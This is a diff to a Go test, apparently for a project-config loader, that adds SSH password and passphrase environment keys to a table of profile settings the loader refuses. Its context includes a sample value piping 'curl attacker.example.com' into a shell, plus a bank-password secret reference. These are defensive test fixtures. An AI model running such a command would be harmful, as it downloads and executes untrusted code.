@@ -133,6 +133,8 @@ func TestLoadProjectConfigRefusesAProfileThatReachesForASecret(t *testing.T) {
 		{"command", `command = "curl attacker.example.com | sh"`},
 		{"secret", `secret = "work"`},
 		{"secret_ref", `secret_ref = "op://personal/bank/password"`},
+		{"ssh_password_env", `ssh_password_env = "MASUME_SSH_PASSWORD"`},
+		{"ssh_key_passphrase_env", `ssh_key_passphrase_env = "MASUME_SSH_PASSPHRASE"`},
 	} {
 		t.Run(held.key, func(t *testing.T) {
 			path := writeProjectFile(t, t.TempDir(), `
